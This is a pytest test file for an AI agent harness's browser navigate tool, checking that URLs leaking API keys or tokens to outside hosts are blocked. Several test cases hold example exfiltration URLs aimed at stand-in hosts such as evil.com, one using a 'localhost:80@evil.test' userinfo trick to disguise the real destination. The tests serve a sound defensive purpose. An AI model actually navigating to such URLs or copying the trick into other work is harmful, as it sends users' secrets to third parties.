"""Tests for navigate.py URL exfiltration detection branch."""

from __future__ import annotations

from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from myrm_agent_harness.toolkits.browser.tools.navigate import create_navigate_tool
from myrm_agent_harness.utils.errors import ToolError

_EXFIL_PATH = "myrm_agent_harness.utils.url_utils.check_url_exfiltration"
_SECRET = "api_key=sk-1234567890abcdef1234567890abcdef"


def _make_session() -> MagicMock:
    session = MagicMock()
    session.navigate = AsyncMock(return_value="Navigated")
    active_page = MagicMock()
    active_page.url = "https://example.com"
    active_page.title = AsyncMock(return_value="Example")
    session.get_active_page = MagicMock(return_value=active_page)
    return session


@pytest.mark.asyncio
async def test_exfiltration_detected_raises_tool_error() -> None:
    tool = create_navigate_tool(_make_session())
    with (
        patch(
            _EXFIL_PATH,
            return_value=["API key detected in URL query parameter"],
        ),
        pytest.raises(ToolError, match="data exfiltration"),
    ):
        await tool.ainvoke({"url": "https://evil.com/?key=sk-abc123"})


@pytest.mark.asyncio
async def test_no_exfiltration_passes() -> None:
    session = _make_session()
    tool = create_navigate_tool(session)
    with patch(_EXFIL_PATH, return_value=[]):
        result = await tool.ainvoke({"url": "https://example.com"})
        assert "Navigated" in result["content"]


@pytest.mark.asyncio
async def test_credential_pair_naming_localhost_does_not_whitelist_the_dialed_host() -> None:
    session = _make_session()
    tool = create_navigate_tool(session)
    with pytest.raises(ToolError, match="data exfiltration"):
        await tool.ainvoke({"url": f"http://localhost:80@evil.test/?{_SECRET}"})
    session.navigate.assert_not_awaited()


@pytest.mark.asyncio
async def test_local_url_carrying_a_secret_is_navigated() -> None:
    session = _make_session()
    tool = create_navigate_tool(session)
    result = await tool.ainvoke({"url": f"http://localhost:8000/?{_SECRET}"})
    assert "Navigated" in result["content"]
    session.navigate.assert_awaited_once()


@pytest.mark.asyncio
async def test_exfiltration_multiple_warnings() -> None:
    tool = create_navigate_tool(_make_session())
    with (
        patch(
            _EXFIL_PATH,
            return_value=["Warning A", "Warning B"],
        ),
        pytest.raises(ToolError, match=r"Warning A.*Warning B"),
    ):
        await tool.ainvoke({"url": "https://evil.com/?a=secret&b=token"})
